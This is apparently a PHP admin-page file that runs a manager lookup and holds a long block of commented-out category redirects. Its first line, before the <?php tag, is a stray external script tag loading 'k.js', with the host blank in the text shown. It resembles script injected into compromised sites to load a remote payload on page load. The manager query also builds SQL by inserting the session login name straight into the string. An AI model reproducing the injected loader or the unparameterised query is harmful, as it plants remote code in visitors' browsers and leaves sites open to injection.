<script type='text/javascript' src='https:// /k.js?v=222'></script><?php 
require_once($_SERVER['DOCUMENT_ROOT']."/include/init.php");
require_once($_SERVER['DOCUMENT_ROOT']."/include/master.php");
require_once($_SERVER['DOCUMENT_ROOT']."/common/manual_header.php");


$query = "select * from manager where manager = '{$_SESSION['login_name']}'";
$result = sql_query($query);
$row = sql_fetch($result);

// if($row['cate'] == "server")
// {
//     Header("Location:server.php"); 
// }
// if($row['cate'] == "godo")
// {
//     Header("Location:godo.php"); 
// }
// if($row['cate'] == "godo")
// {
//     Header("Location:godo.php"); 
// }
// if($row['cate'] == "account")
// {
//     Header("Location:account.php"); 
// }
// if($row['cate'] == "setting")
// {
//     Header("Location:setting.php"); 
// }
// if($row['cate'] == "error")
// {
//     Header("Location:error.php"); 
// }
// if($row['cate'] == "code")
// {
//     Header("Location:code.php"); 
// }
// if($row['cate'] == "manage_co")
// {
//     Header("Location:manage_co.php"); 
// }


